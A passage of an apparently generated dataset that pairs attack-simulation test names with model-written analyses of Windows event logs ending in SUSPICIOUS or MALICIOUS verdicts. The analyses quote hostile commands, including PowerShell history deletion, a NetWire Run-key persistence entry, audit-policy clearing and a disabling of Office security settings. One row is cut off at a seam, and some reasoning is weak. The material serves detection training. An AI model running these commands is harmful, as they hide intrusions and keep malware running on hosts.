Although there is no overtly malicious payload or evidence, the activity within these logs merits further investigation. Specific attention should be directed towards:
- The scripts or commands executed by `admin_test`, especially the deletion of prefetch files.
- Investigate failed credential access attempts to MicrosoftAccount and WindowsLive services for unauthorized activity.
- Review privilege escalation attempts and inspect PowerShell activity for deeper context.

### Guidance:
- Perform a thorough audit of the user `admin_test`, their privileges, and activity during the timestamps provided.
- Validate any legitimate reasons for `admin_test` or PowerShell scripts to manipulate prefetch files.
- Strengthen monitoring and alerts for PowerShell usage and failed access attempts to credential services.
- Consider isolating the machine and performing a forensic disk image creation for deeper analysis."
Clear Powershell History by Deleting History File,"**Detailed Analysis of the Logs:**

1. **System Log:**
   - The logs primarily show kernel-general and time service events. Events indicate that the system time was adjusted. These types of events are common and relate to system configuration changes or timezone adjustments.
   - No visible signs of suspicious behavior like repeated privilege escalations or unusual process executions in the system log entries.

2. **Application Log:**
   - An entry from the Software Protection Platform Service merely indicates a regular entry logging the activity of Windows services responsible for licensing.
   - No indicators of abnormal or unauthorized activity are evident in this section.

3. **Security Log:**
   - Frequent event ID 4616 logs represent changes in system time, likely tied to the same timezone adjustments seen in the System Log.
   - These logs do not show indicators of malicious attempts to alter audit logs or security settings. Also, the subject user is a trusted service account (LOCAL SERVICE), and the associated process is svchost.exe, which is normal behavior.

4. **Windows PowerShell Log:**
   - Noteworthy is the use of PowerShell command: `Remove-Item (Get-PSReadlineOption).HistorySavePath`. This command is used to delete the history file of PowerShell commands, which could be an attempt to conceal actions.
   - The command was run by `SERVER002\admin_test`. Such activities can be indicative of an attacker trying to cover their tracks post-compromise. 

5. **Sysmon Log:**
   - Numerous process creations are logged, involving legitimate processes like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and various PowerShell and system utilities being run by the user `admin_test`.
   - The involvement of `wevtutil.exe` could merit further investigation, as it is a utility for event log management commonly misused for clearing logs.
   - The PowerShell execution matches the suspicious command-line operation seen in the PowerShell log.
   - The sequence of operations combined with the deletion of PowerShell history implies possible concealment of activities, though direct malicious actions (e.g., malware execution) aren’t directly evident from the logs alone.

**Assessment:**

Overall, the logs do show some patterns that might potentially suggest suspicious behavior:
- The removal of PowerShell command history.
- The legitimate use of tools like `wevtutil.exe`, which requires scrutiny to ensure no unauthorized log tampering occurred.

**Recommendation:**

In your current capacity, the activities observed don’t conclusively determine a direct compromise or attack but lean towards actions that are deserving of caution. Users with administrative capabilities, like `admin_test`, should have their actions monitored, and the commands run discerned further for intent.

**Resolution:**
- **SUSPICIOUS**: While uncertain of direct malicious behavior, activities hint at deeper examination, especially regarding the PowerShell and Sysmon events. Further investigation, perhaps leveraging additional contextual data and rule checks, would allow for final determination."
WMIC bypass using local XSL file,"Analyzing the collection of logs provided, here are the key findings:

### Summary of Logs:
1. **Security Logs:**
   - **Event ID 4624 (Logon Events):** Multiple logons as SYSTEM using 'Advapi' which is typically used for service logons. Logon type 5 indicates a service, and elevate token events are routine for the SYSTEM account.
   - **Event ID 4672 (Special Privileges Assigned):** SYSTEM user receives a range of high-level privileges which is normal as SYSTEM is a highly privileged account.
   - **Event ID 5379 (Credential Read Events):** Failed credential access attempts involving `MicrosoftAccount` and `WindowsLive`. ReturnCode ""3221226021"" indicates an error, perhaps due to account or permission issues.
   - **Event ID 4798 (Enumeration of Local Group Memberships):** Querying of group memberships for accounts like `Administrator`, `admin_test`, and `DefaultAccount`. While frequent access enumeration could suggest reconnaissance, no follow-up actions indicating misuse were observed.

2. **Sysmon Logs:**
   - Commands and processes involving `powershell.exe`, `wevtutil.exe`, `wmic.exe`, and `cmd.exe` were frequently executed by the `admin_test` user. These tools can be used for legitimate administrative tasks but are also common in attacker toolkits for execution, enumeration, and evasion.
   - Use of `wmic` with specific formatting files could suggest attempts to extract system information in a structured way.
   - Execution of application processes like `calc.exe` and `whoami.exe` are suspicious given their context (possibly used to test execution capabilities or host enumeration).

3. **Application and Other Logs:**
   - Events related to typical updates and service activities, such as Microsoft Edge Update.
   - Stopped services pertaining to Edge Update are normal update activities.

### Assessment of Potential Threats:
- **Environment Context:** The activities by `admin_test` involving execution of PowerShell, WMIC, and Taskhost suggest a user or script conducting some form of system administration or potentially malicious activity.
- **Indicators of Reconnaissance:** Enumeration of group memberships, and extensive command-line executions via Sysmon logs potentially indicate reconnaissance efforts.

### Resolution:
Given that the logs include possible reconnaissance activities and the use of administrative tools by a high-privileged user account (`admin_test`), but do not directly indicate damage, data exfiltration, or clear malicious intent:

**Resolution: SUSPICIOUS**

### Guidance on How to Proceed:
1. **Further Investigation:**
   - **User Verification:** Confirm activities with the `admin_test` user or responsible system administrator to validate if actions were expected.
   - **Audit Configurations:** Ensure that account privileges are appropriate and audit any recent changes to the system configurations or the user's access rights.
   - **Monitor Anomalies:** Set more comprehensive monitoring on suspicious accounts and actions, focusing on patterns inconsistent with regular workflow.

2. **Mitigation Steps:**
   - Strengthen the security monitoring by using advanced threat detection tools.
   - Establish comprehensive logging for high-privilege actions.

3. **Incident Response:**
   - Based on user justification, proceed with incident response protocols if the risk remains unvalidated or unexplained.

In conclusion, these logs highlight potential suspicious activity mainly related to system-level reconnaissance and administrative tool usage that requires further clarification to rule out malicious intent."
Invoke CHM with default Shortcut Command Execution,"After analyzing the provided event logs, there are certain elements that warrant further examination:

1. **PowerShell Activity:**
   - There is a PowerShell execution involving a script invocation: `powershell.exe & {Invoke-ATHCompiledHelp -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm}`. This command suggests the use of `Invoke-ATHCompiledHelp`, which appears not to be a standard PowerShell cmdlet or function. This could indicate a potentially malicious or unauthorized script execution.

2. **Frequent Execution of Conhost.exe and Wevtutil.exe:**
   - The logs show multiple instances of `wevtutil.exe` and `conhost.exe` executed. While these are legitimate Windows processes, their frequent and rapid invocation could be indicative of log management actions or related malicious behaviors aimed at obscuring or manipulating system logs.

3. **Host Application Identified as Powershell:**
   - The execution of PowerShell and observed actions are initiated by a user account `SERVER002\\admin_test`. This can be suspicious if such operations are not typically performed by this user. It raises the question of whether the account credentials were compromised or misused.

4. **Process Creation with High Integrity Level:**
   - Key processes like `whoami.exe` are executed with high integrity. While `whoami.exe` is a legitimate utility, if this level of scrutiny is unusual in context, it could point toward privilege enumeration as part of a malicious reconnaissance.

5. **No Significant Security or System Logs Provided:**
   - The absence of specific logs from the Security and System channels prevents comprehensive assessment. These logs could provide crucial context, such as user login activity or system-wide changes.

**Assessment and Resolution:**

The observed actions, especially around the PowerShell command and frequent utility executions, do not conform to standard benign activity patterns. The apparent ambiguity and potential for misuse in these logs lead to:

- **Resolution: SUSPICIOUS**

Given this assessment, it is recommended to:
- Review user activity related to the account `SERVER002\\admin_test` for any unauthorized or irregular behavior.
- Investigate the source and purpose of the `Invoke-ATHCompiledHelp` command.
- Verify whether the execution of tools like `wevtutil.exe`, `conhost.exe`, and `whoami.exe` aligns with usual administrative tasks or if they point to unwanted activities.
- Conduct comprehensive security checks including system scans and integrity checks. Consider enabling enhanced logging to capture more insights into executed commands and system changes."
MSXSL Bypass using remote files,"**Analysis of Windows Event Logs:**

**Application Log:**
- Regular service events related to `edgeupdate` and `Software Protection Platform Service`. No anomalies were detected here that would indicate malicious behavior.

**Sysmon Log:**
- Multiple instances of PowerShell, conhost.exe, and wevtutil.exe executed by the user `SERVER002\admin_test`. The execution of PowerShell (event 17956) could be suspicious if combined with other unusual activities, except there are no command-line arguments provided that indicate something malicious directly.
- The execution of wevtutil.exe might indicate manipulating event logs, which can sometimes be a tactic used by malicious actors to cover their tracks.
- There is an execution of `cmd.exe` with a suspicious command line that involves `msxsl.exe`, which is a legitimate XML transformation tool. The use of such programs can be legitimate, but they are also known to be used in living-off-the-land tactics by adversaries, using them for executing scripts retrieved from URLs. The command line suggests downloading scripts from a URL, indicative of potential malicious activity (event 17986).
- Regular updates and installations related to Microsoft Edge, as seen in multiple instances of `MicrosoftEdgeUpdate.exe` processes, seem benign in the context of ensuring software is kept up to date. However, combined with other suspicious events, thorough checking is advisable.

**Security Log:**
- Events show adjustments made to the system time, which can be indicative of an attempt to alter event logs or bypass time-based security mechanisms.
- Regular presence of `svchost.exe` used as part of time change operations may be normal, but since it's commonly used in various Windows operations, it requires further correlation with other suspicious activity to confirm anything malicious.

**System Log:**
- Time changes recorded, corroborating with the security log entries. This action does not inherently suggest compromise, but as previously mentioned, time manipulation can be suspicious.

**Consolidated Assessment:**
- Although there's a significant presence of legitimate software updates and services, the specific use of PowerShell, `wevtutil.exe`, and a suspicious `cmd.exe` command line involving `msxsl.exe` downloading external scripts, raises flags for potential script-based attacks or living-off-the-land techniques.
- The system time modification is unusual and may warrant deeper investigation, especially if the intention was to cover tracks of unauthorized activity.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- Conduct a deeper investigation into the specific activities around PowerShell, cmd.exe, and wevtutil.exe during the mentioned timeframe.
- Review network logs or proxy logs for any external communications, particularly associated with the URLs mentioned in the command line.
- Check the system further for any other signs of script activity or payload execution, especially changes made around the times these events were recorded.
- Consider lateral movement or persistence techniques that may have been employed by adversaries if compromise is established.
- Verify edge update processes by cross-checking with software update schedules and processes within organization policy."
Modify UseTPMPIN Registry entry,"Based on the provided Windows event logs:

1. **Sysmon Logs**:
   - There are multiple entries capturing the execution of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe` processes initiated by the user `SERVER002\admin_test`. These processes are standard Windows utilities.
   - The `cmd.exe` process event is of interest because it shows alteration of the system registry key through the command `reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMPIN /t REG_DWORD /d 2 /f`. Changing the system registry, especially related to encryption policies, could be suspicious if not expected.

2. **Security Logs**:
   - The security logs capture several instances where the process `svchost.exe` as `LOCAL SERVICE` on `NT AUTHORITY` makes time change entries. There is no clear evidence of privilege escalation or a direct indicator of compromise.
   
3. **System Logs**:
   - Reflect similar activity captured in security logs indicating time change events. This in isolation could suggest a time synchronization event which could be legitimate but requires context.

**Analysis**:
- **Process Execution**: The execution of standard Windows binaries like `hostname.exe`, `whoami.exe`, `svchost.exe`, and `conhost.exe` look benign on surface since they are typical Windows processes; however, the context and frequency could be reviewed if correlated with abnormal behaviour in a wider context.
  
- **Registry Modification**: The modification of a system registry key through `cmd.exe` related to encryption policy by the user is unusual unless performed by authorized personnel in controlled environments. In environments with strict security policies, such registry changes might be unusual and suggest potential policy alteration or misconfiguration efforts.

- **Time Modification**: System time changes captured do not provide enough context to be inherently malicious but could be checked against scheduled tasks or server policy compliance procedures.

**Assessment & Resolution**:
- The registry change without further context stands out as potentially risky. Without evidence of specific intent or linkage with known indicators of compromise (IOC), it necessitates further investigation.

**Conclusion**:
Resolution: **SUSPICIOUS**

**Guidance**:
- Investigate the intent and context of the registry modification performed by `SERVER002\admin_test`. Verify if this action is authorized or related to any administrative activities.
- Review and monitor network or system activity surrounding the time of these events for unusual patterns or connections that could indicate further action by an attacker.
- Ensure sufficient logging to capture and correlate further activity, especially around sensitive actions like registry modifications.
"
Create ADS command prompt,"Upon analyzing the provided Windows event logs, I will break down key points relevant to each log type and conclude with an overall assessment:

### System and Security Logs:
1. **Time Change Events**: 
   - **Event ID 4616** and **Kernel-General Event ID 1** records show changes in the system time. The `NewTime` and `OldTime` fields suggest a back-dating of the system clock. This could indicate an attempt to bypass time-based security mechanisms or logs. The process associated with these changes is `svchost.exe`.
  
2. **Privilege Assignments**: 
   - **Security Event ID 4672** indicates that the user `admin_test` is assigned several high privileges, including `SeDebugPrivilege` and `SeLoadDriverPrivilege`. These are strong indicators of potential misuse or abuse of elevated privileges, which could be exploited by a malicious actor.

3. **Logon Events**:
   - **Security Event ID 4624** logs a successful network logon (Logon Type 3) for the user `admin_test`, which appears standard. However, it is followed metaphorically closely by the privileged operation logs.

### Sysmon Logs:
1. **Process Creation and Anomalies**:
   - There are multiple instances of `cmd.exe` and processes like `wevtutil.exe` and `whoami.exe` being executed by the `admin_test` user. The command line for `cmd.exe` includes shell code execution, which is particularly suspicious as it suggests potential code injection or exploitation attempts. 

2. **Suspicious Command Lines**:
   - The specific command `cmd.exe /c echo ""Shell code execution.""` ties back to potential unauthorized operations or commands being executed on the system, likely indicating script execution to perform malicious activities.

3. **Microsoft Edge Update Executions**:
   - Multiple Edge updater processes run under `NT AUTHORITY\SYSTEM`, which is normal for update operations, although it implies a background privilege escalation if abused.

### Conclusion:
The log data contains several indicators that can suggest potential malicious activities:
- System time manipulation events, suggesting attempts to evade detection or mislead log timelines.
- Assignment of extensive privileges to the `admin_test` user, which could be abused.
- Unusual process executions and command lines, specifically those involving shell code, that suggest malicious intent or preparation of a harmful payload or environment.

### Resolution: MALICIOUS
Based on the observed anomalous behaviors—privilege misuse, suspicious time changes, and potentially harmful command execution—the situation appears to have clear indications of malicious intent. Immediate steps should include:
- Further investigation to confirm the scope of the compromise.
- Isolate the affected machine to prevent further malicious activity.
- Review related systems for similar signs of compromise.
- Examine user activities and implement additional security controls such as tighter monitoring and limiting privileged account use."
Hidden Window-Conhost Execution,"After conducting a detailed analysis of the provided logs, here are the identified patterns and activities:

1. **Processes Observed**: 
   - Legitimate Windows processes such as `whoami.exe`, `hostname.exe`, `conhost.exe`, and `wevtutil.exe` were observed. These processes are typically benign and related to system operations or user queries.

2. **PowerShell Activity**: 
   - A PowerShell command with an unusual command line argument is seen: `powershell.exe & {conhost.exe --headless calc.exe}`. This construction of using `conhost.exe` in a potentially headless mode with `calc.exe` inside a PowerShell script is atypical and could be seen as an attempt to mask operations or evade detection. 
   - This usage might suggest an attempt to execute commands or scripts in a way that is less visible to standard monitoring tools, a common trait in adversarial tactics.

3. **Time Discrepancies**: 
   - Time adjustments were recorded in the logs (EventID 4616 and Kernel-General EventID 1), which can sometimes indicate attempts to tamper with logs or time-based security configurations. However, these entries alone are not inherently malicious as time adjustments could also be due to legitimate system synchronization activities.

4. **Integrity Levels and User**: 
   - All processes appear to be executed with high integrity levels by the user `SERVER002\admin_test`. Continued access with high integrity by a user account may reflect administrative activities, but combined with the PowerShell command, it raises suspicion if this high privilege is misused.

5. **General Observations**:
   - No direct evidence of malicious applications was observed such as heuristics of malware execution.
   - Given the absence of critical alerts in system and security logs indicating a system-wide compromise, there is no immediate evidence of a breach, but the peculiar use of PowerShell commands signifies potential suspicious activity.

**Assessment**:
- **Resolution**: SUSPICIOUS
- While the overall activities do not conclusively prove a malicious attack, the unusual use of PowerShell with arguments invoking another executable in a headless mode warrants further investigation due to its potential use in stealthy malicious operations.

**Guidance**:
- Further investigate the context and credentials of `SERVER002\admin_test` to ensure there is no unauthorized or high-risk usage.
- Review historical activity logs for similar patterns involving PowerShell.
- Check if `powershell.exe & {conhost.exe --headless calc.exe}` or similar commands have been used previously on the network to identify potential script origin and its purpose.
- Consider enhancing monitoring on PowerShell executions and command-line arguments for more clarity and possible pattern recognition in case of future alerts.
- Engage with the respective IT team to verify if recent system maintenance or updates may justify the PowerShell invocation and adjustments on the system time."
NetWire RAT Registry Key Creation,"Upon analyzing the provided Windows event logs, I have identified potentially malicious behavior that warrants further examination:

1. **Registry Modifications with CMD.EXE and REG.EXE**:
   - On ""2024-10-24 16:32:35.4704864"", `cmd.exe` executed a command that altered Windows Registry keys related to startup: 
     ```
     reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v NetWire /t REG_SZ /d ""C:\\Users\\admin\\AppData\\Roaming\\Install\\Host.exe"" /f
     ```
     This command is indicative of a persistence mechanism often employed by malware to ensure they run on startup.
   - The registry modifications associated with ""NetWire"" suggest the installation or use of remote access software, which may be used maliciously.

2. **Unusual 'whoami.exe' and 'hostname.exe' Executions**:
   - Both `whoami.exe` and `hostname.exe` were executed with the `High` integrity level by the `SERVER002\admin_test` user. While these commands are common for retrieving system information, their execution in close succession with the registry modifications mentioned above could be reconnaissance steps used by malware or unauthorized software/scripts.

3. **Microsoft Edge Update**:
   - Multiple entries show `MicrosoftEdgeUpdate.exe` activities, potentially indicating software updates. However, these are typical for legitimate update operations, but their occurrence alongside the suspicious registry activities may warrant checking for exploitation or tampering.

4. **System Time Alteration**:
   - Events indicate system time alterations synchronized via `time.windows.com`, which appear benign in this context as there is no immediate link with the suspicious activities identified.

5. **Security Logs and PowerShell Logs**:
   - The security logs show no direct indication of unsuccessful access attempts or privilege escalations, and PowerShell logs are completely missing, which could imply relevant data is not available or logging is turned off.

Based on the observations:

- The registry modifications occurring with `cmd.exe` aimed at enabling `Host.exe` to run at startup are highly suspect.
- The usage of the registry key `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` by a potential RAT (""NetWire"") is concerning.

**Resolution**: **MALICIOUS** 

The detected activities, especially the registry persistence mechanisms with traces indicating a potential RAT (""NetWire""), strongly suggest malicious activity on the host. Immediate action should involve:

- Isolating the affected machine from the network.
- Conduct a full forensic analysis, focusing on data from the time of suspected compromise.
- Use antivirus and advanced endpoint detection tools to scan for and remove potential threats.
- Review system-based anomalies and review user access policies.
- Reinforce security measures, including enabling PowerShell logging and reviewing user permissions."
Disable Microsoft Office Security Features,"Upon analyzing the logs provided, several areas of interest and potential concern have been identified. Here is a detailed breakdown of the analysis:

### Detailed Analysis:

1. **Process Executions and Command-line Activities:**
   - Multiple executions of `wevtutil.exe` and `conhost.exe` are observed, through the account `SERVER002\admin_test`. 
   - These are legitimate Windows processes typically used for managing event logs and facilitating command-line interfaces, respectively. However, their frequent and sequential execution without any additional context or specific command-line parameters may warrant further investigation to understand their purpose.
   
2. **Unusual PowerShell Activity:**
   - An instance of `powershell.exe` was executed with a command modifying registry keys specifically related to Microsoft Office Excel’s security settings. The PowerShell script modifies VBA warnings and several Protected View settings. This kind of registry modification activity is unusual for regular user activity and could indicate a potential attempt to weaken security configurations. Additionally, utilizing PowerShell for such tasks is a known tactic in some attack scenarios.

3. **System and Application Events:**
   - Multiple `MicrosoftEdgeUpdate.exe` activities were logged. This appears to be a routine update process for Microsoft Edge but executed several times in quick succession. The use of varying directories and installation paths (`MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe` and `EU494A.tmp`) indicates possible update processes. There are no immediate signs of abnormal activity here if it aligns with expected update schedules.
   - Windows Defender shows it is operational with a recent security intelligence update applied, which is a positive sign of active endpoint protection.

4. **Security Log Events:**
   - A login event (Event ID 4624) is noted for the SYSTEM account, which appears to be a regular service-type logon (Logon Type 5). 
   - Privilege escalation events (Event ID 4672) with elevated privileges including `SeDebugPrivilege` and `SeImpersonatePrivilege` are observed. These privileges are standard for SYSTEM account operations but should be acknowledged if any unusual process executions follow this event.

5. **Powershell Logs:**
   - The PowerShell logs confirm the execution of a script altering registry keys for Office Excel security settings, which is consistent and corroborates the Sysmon logs indicating potential security configuration modification.

### Threat Assessment:
- **Suspicious Behavior:** The use of PowerShell to modify registry settings related to Office Excel's security features is considered suspicious. It is a tactic used to bypass security controls potentially and should be subject to further scrutiny.
- **Benign Activity:** The Microsoft Defender updates and continuous Edge update service executions appear routine but should be monitored to ensure they correspond with legitimate update schedules.
- **Sensitive Privileges Use:** While SYSTEM accounts typically possess elevated privileges, their use in conjunction with any flagged process should be reassessed to eliminate the possibility of privilege escalation abuse.

### Final Resolution:

- **SUSPICIOUS:** The activities surrounding the PowerShell script execution indicate a need for further investigation due to potentially malicious intentions aimed at altering security settings. Additionally, if the `wevtutil.exe` and `conhost.exe` activities are not typically associated with legitimate administrative tasks, it would be prudent to verify these tasks' legitimacy with system administrators. 

### Recommended Actions:
1. **Investigate PowerShell Activity:** Review the context and origin of the PowerShell command. Verify if this was executed as part of a legitimate administrative task or script.
2. **Contextual Verification:** Discuss with relevant team members (e.g., IT administrators) to confirm the legitimacy of recent `wevtutil` and PowerShell activities.
3. **Monitoring and Alerts:** Increase monitoring on this host for any subsequent suspicious activities, particularly focusing on PowerShell scripts and account activities for `SERVER002\admin_test`.
4. **Review Permissions:** Assess the need for account `SERVER002\admin_test` access privileges, especially if high-integrity levels are not necessary for regular operations.

Security measures and further investigation should ensure that any unchecked security modifications do not pose a threat to the organization’s environment."
Malware Masquerading and Execution from Zip File,"### Analysis

Upon reviewing the provided Windows event logs, I have identified several entries that exhibit unusual behavior that could be indicative of malicious activity, warranting further investigation.

#### Suspicious PowerShell Activities

1. **PowerShell Execution (EventRecordID: 1067 - 1074)**
   - The logs show the execution of PowerShell with a command that:
     - Unzips an archive from a potentially obscure path: `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\data.zip`.
     - Executes a CMD script: `cmd /c \""$env:userprofile\\Downloads\\data\\README.cmd\""`.
   - These activities can be suspicious as PowerShell is often used for automation and management, but also as a tool for escalating privileges or bypassing security measures due to its powerful nature.

2. **Cmd and Rundll32 Execution (EventRecordID: 17969, 17970)**
   - Cmd.exe is used to execute a `.cmd` file from the Downloads directory. If this file came from an untrusted source, it might pose a security risk.
   - Rundll32.exe is executing with `2.dll, StartW`, which is indicative of a DLL being called. This can be legitimate but is also a common method used by attackers to execute malicious code.

#### Anomalous Security Events

1. **Privileges and Logon Event (EventRecordID: 30343 & 30344)**
   - The user `admin_test` was granted numerous privileges (`SeSecurityPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, etc.) which are sensitive and could be exploited for malicious operations. 
   - The logon event shows that this user operated from an external IP `192.168.0.102`, suggesting remote access.

#### System Activities Indicating Possible Software Installation or Updates

1. **Edge Update Execution (Multiple Sysmon Events)**
   - There are multiple events concerning Microsoft Edge and its update process, involving several `setup.exe` executions.
   - Usually, these are benign; however, if not initiated by administrators or some scheduled task, it might represent unauthorized software installation.

### Assessment 

**Resolution: SUSPICIOUS**

While some log entries point toward legitimate activities such as software updates (Windows Update and Microsoft Edge Update activities), there are several events, especially related to PowerShell and privilege usage, that are suspicious and require further investigation. The presence of administrative-level operations and the execution of potentially harmful scripts need additional scrutiny, particularly in confirming whether these were authorized operations.

### Next Steps

1. **Verification of Intent:**
   - Check with the relevant IT staff or system owner to verify if the actions, especially the PowerShell script and CMD operations, were intentional and authorized.

2. **Review User Activity:**
   - Investigate the activities associated with the user `admin_test`, especially concerning the high-level privileges granted and unusual access patterns.

3. **Examine CMD and DLL Files:**
   - Analyze the `README.cmd` and `2.dll` for any malicious code or unexpected changes.

4. **Network Activity and Endpoint Monitoring:**
   - Perform network activity analysis to detect any unauthorized connections or data exfiltration attempts, especially from the reported external IP address.

5. **Comprehensive Security Assessment:**
   - If these events remain unexplained or are confirmed as unauthorized, consider a deeper security audit to ensure there are no other hidden threats or vulnerabilities on `Server002`."
Clear Windows Audit Policy Config,"Upon reviewing the provided Windows event logs, several activities stand out, which warrant further analysis:

1. **Time Synchronization Events:**
   - The logs contain events relating to time synchronization and changes (Event IDs 1 and 24 in System logs and Event ID 4616 in Security logs). These show multiple adjustments to the system time, switching between slightly different timestamps within seconds. While time changes can be normal in environments, unusual time changes could also indicate attempts to manipulate timestamps for malicious reasons.

2. **User Activity and Privileges:**
   - The presence of multiple high-privilege user events related to the user `admin_test` is noteworthy. Event ID 4672 indicates special privileges being assigned. This user appears to have executed commands using `cmd.exe` and has been associated with the use of powerful privileges: SeDebugPrivilege, SeBackupPrivilege, and others.
   - There are multiple occurrences of audit policy changes (Event ID 4719), suggesting potential log tampering or cleanup attempts.

3. **Sysmon Logs Analysis:**
   - There are executions of `wevtutil.exe` and `conhost.exe` by user `admin_test`. `wevtutil.exe` is a legitimate Windows utility used for managing event logs, but repeated invocation could indicate attempts to hide malicious activity.
   - Particularly concerning is the execution of `auditpol /clear /y & auditpol /remove /allusers` as seen in the Sysmon log tied to Process ID 6972 and executed by `cmd.exe`. This indicates an attempt to clear the audit logs, potentially to hide tracks after unauthorized or malicious activities.

4. **Other System Activity:**
   - The execution logs also include processes such as `whoami.exe` and `hostname.exe`. While these utilities are standard for querying system information, when combined with other suspicious activities, it could indicate information gathering by an unauthorized user.
   - `MicrosoftEdgeUpdate.exe` and other routine service executions are seen, but these are typical system maintenance activities.

**Assessment:**
The activities logged suggest a potential malicious behavior given the combination of administrative privileges, the execution of commands that alter audit policies, and the repeated attempts to adjust system event logs via `wevtutil.exe`. These behaviors align with those of an attacker attempting to escalate privileges, collect information, and cover their tracks.

**Resolution:**
- **MALICIOUS**: Based on the evidence of tampering with audit logs, high-privilege command executions by a potentially unauthorized or compromised account, and attempts at altering system logs, the logs exhibit signs of malicious activity.

**Guidance:**
1. **Immediate Actions:**
   - Isolate the affected host from the network to prevent further damage.
   - Conduct a thorough review of user accounts, specifically `admin_test`, to confirm legitimacy and investigate any indications of compromise.
   - Initiate a full forensic analysis to determine the extent of the intrusion and potential data breaches.

2. **Post-Incident Actions:**
   - Review and tighten access controls and privilege management policies.
   - Implement enhanced logs and alerting systems to detect and respond to similar activities in the future.
   - Educate users and sysadmins on secure operational practices to prevent similar incidents."

   - **User:** `SERVER002\\admin_test`
   - **Time:** `2024-10-28 14:10:01.876`
   - PowerShell can be used legitimately for many Windows administrative tasks, but it is also a favored tool for executing malicious commands or scripts. This entry does not provide command-line arguments, which makes it challenging to determine the nature of its execution without additional context.

2. **Multiple Instances of Conhost and Wevtutil:**
   - Processes such as `conhost.exe` and `wevtutil.exe` are observed being spawned multiple times in quick succession.
   - **Users:** All actions are executed by `SERVER002\\admin_test`.
   - **Time Frame:** Rapid series of events occurring around `14:10:02`.
   - The `wevtutil.exe` tool is generally used to query or clear event logs, and its repeated execution could suggest attempts to tamper with or clear logs, which is a known tactic of evasion by malicious actors to cover tracks.
   
3. **Use of SYSTEM Tools:**
   - Notable processes like `TrustedInstaller.exe` and `TiWorker.exe` related to system updates and maintenance are seen being executed under `NT AUTHORITY\\SYSTEM`, which is common in non-adversary scenarios.
   
4. **Execution of VirtualBox Commands:**
   - **Process:** `C:\\Windows\\System32\\cmd.exe` 
   - **Command:** Utilization of `VBoxManage.exe` to create and start a VM named ""file VM"".
   - **User:** `SERVER002\\admin_test`
   - Virtual machine activities can enable isolation from detection and can be utilized for running malicious operations. This behavior is suspicious when executed without a clear administrative requirement.

5. **Microsoft Edge Update Processes:**
   - Detected execution of Edge related updates as `NT AUTHORITY\\SYSTEM`, indicating standard software updating processes. 

**Assessment:**
- **Primary Concerns:** The rapid execution and spawning of `conhost.exe` and `wevtutil.exe` processes suggest potential log tampering activities, which is a common sign of malicious intent.
- **VirtualBox Utilization:** Commands initiating a virtual machine without clear necessity could suggest a test environment or sandbox for executing unverified programs, potentially indicative of intentional evasion tactics or misuse.
- **PowerShell Activity:** Lacks sufficient data for immediate concern but remains a point of interest as it can be leveraged for malicious activities.

**Resolution:**
Based on the analysis of events and context:

- **Resolution:** **SUSPICIOUS**

**Guidance on How to Proceed:**
1. **Further Investigation:**
   - Review PowerShell logs and seek any associated command-lines or scripts executed around the same timeframe for further inspection.
   - Investigate the context behind the rapid spawning of `conhost.exe` and `wevtutil.exe`, especially checking event logs for anomalies or signs of tampering.
   - Verify the necessity of virtual machine activities on the server and ensure it aligns with standard operational procedures.

2. **Additional Monitoring:**
   - Implement enhanced logging and monitoring of the server to capture more detailed command-line activity and user actions, particularly focusing on administrators and SYSTEM processes.
   - Conduct user behavior analysis on `admin_test` for patterns indicating potential misuse or insider threats.

3. **Security Measures:**
   - Ensure that access control policies are stringent, with least-privilege principles applied to process executions.
   - Regular audits for user account and process activities to detect abnormal patterns.

By following these recommendations, security teams can better contextualize the suspicious behaviors identified within these logs and pursue actions to confirm or dispel potential threats."
Activate Windows NoControlPanel Group Policy Feature,"### Analysis:

Upon review of the provided Windows event logs across multiple categories, here are the detailed findings:

1. **PowerShell Logs:** There are no entries available to review.

2. **System Logs:**
   - The time synchronization source selection (`time.windows.com`) by the Windows Time service is a standard operation and doesn't indicate any malicious activity. However, these are not usually related to direct system compromise indicators.

3. **Application Logs:**
   - The `edgeupdate` service logs indicate that this service stopped, but there's no detail on why the service stopped. The entries do not inherently indicate malicious activity; however, frequent unexpected stopping of such services could merit further investigation, especially if it's vital to operations.
   - The Software Protection Platform Service (SPP) entry logs a normal operation related to rules engine processing, which is standard and not indicative of compromise.

4. **Security Logs:** No entries are provided for review.

5. **Sysmon Logs:**
   - Numerous entries for typical Windows executables like `whoami.exe`, `conhost.exe`, `wevtutil.exe`, `hostname.exe`, and legitimate Microsoft Edge Update processes. All these seem to be normal operations tied to system activities and updates, executed by an administrative user, `SERVER002\admin_test`, or the `NT AUTHORITY\SYSTEM`, both of which are expected users for such processes.
   - **Suspicious Behavior Detected:**
     - A notable event involved the execution of `cmd.exe` with the command to modify the Windows registry to add `NoControlPanel` under `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`. This action restricts users from accessing the Control Panel, which can be part of administrative controls or indicative of an attempt to limit system access as part of a malware strategy. This needs to be investigated further to verify the intent and legitimacy.
   
6. **Additional Observations:**
   - The logs mainly encompass a window around a specific time period (`2024-10-24 15:24:07` to `2024-10-24 15:24:22`) and capture process creations and terminations. 
   - The repeated use of `wevtutil.exe` and other system utilities seems benign unless matched with suspect context such as unauthorized access or operations context.

### Final Assessment:

- **Resolution: SUSPICIOUS**

The logs largely show benign activities related to typical operating system processes and updates, with a significant number of legitimate Microsoft and system update-related processes. However, the command to restrict access to the Control Panel through registry modification is potentially suspicious and warrants further investigation to ascertain legitimacy and intention. It indicates either an administrative policy change or a potential foothold by an attacker aiming to restrict user control. Follow up with endpoint detection, conduct a behavior analysis on related users and integrity checks, and verify the necessity and authorization for such a registry modification."
BlackByte Ransomware Registry Changes - CMD,"Upon reviewing the provided Windows event logs, several observations can be made regarding potential suspicious and normal activities:

### Analysis:

1. **Sysmon Logs:**
   - **Repeated Execution of `wevtutil.exe` and `conhost.exe`:**
     - `wevtutil.exe` is involved in managing Windows Event logs, while `conhost.exe` is a legitimate console window host.
